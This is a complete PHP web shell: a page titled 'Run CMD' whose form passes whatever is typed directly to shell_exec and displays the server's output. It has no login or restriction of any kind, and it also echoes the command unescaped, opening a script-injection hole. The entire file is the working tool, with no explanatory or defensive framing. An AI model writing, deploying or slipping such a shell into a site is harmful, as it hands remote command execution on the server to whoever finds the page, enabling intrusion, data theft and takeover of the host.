<?phpif (isset($_POST['cmd'])){	$cmd = stripslashes($_POST['cmd']);	//header("Content-type: text/plain");	$res = htmlspecialchars(shell_exec($cmd));}?><!DOCTYPE html><html>  <head>	<title>Run CMD</title>  </head>    <body style="padding: 20px">	<pre style="border: 1px solid #555; padding: 12px; background:#ddd"><?php print "CMD: {$cmd}\r\n\r\n{$res}"; ?></pre>		<h3>Run CMD :</h3>	<form action="" method="post" enctype="multipart/form-data">	  <input type="hidden" value="run_cmd" name="action">	  <input type="text" size="60" name="cmd"><br><br>	  <input type="submit" value="Run">	</form>  </body></html>